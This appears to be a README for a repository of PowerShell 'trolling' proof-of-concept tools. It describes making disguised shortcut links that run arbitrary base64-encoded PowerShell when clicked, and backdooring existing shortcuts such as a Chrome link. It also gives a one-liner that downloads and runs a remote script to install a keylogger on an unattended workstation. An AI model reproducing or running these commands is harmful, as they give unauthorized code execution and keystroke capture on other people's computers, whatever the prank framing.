# trollsrc
PoCs to share for trolling

.\make-shortcut.ps1 will assist in generating malicious shortcut links (chrome Icon by default)

It will take arbitrary powershell 1 liners as an argument to base64 encode and execute when the icon is clicked



.\bd-lnk.ps1 will take an executable shortcut as an argument, and backdoor with a troll message payload

.\bd-lnk.ps1 -sourcepath "$env:homepath\desktop\google chrome.lnk" 

this will copy the icon to $env:homepath\trollz\linkbackup\google chrome.lnk for restoration

it will backdoor the link with a troll msg and then redirect execution to the origional application


iex (new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/pooki3bear/trollsrc/master/keyimp.ps1")

At an unattended workstation loads up a keylogger that pops calc.exe anytime 'c' is pressed
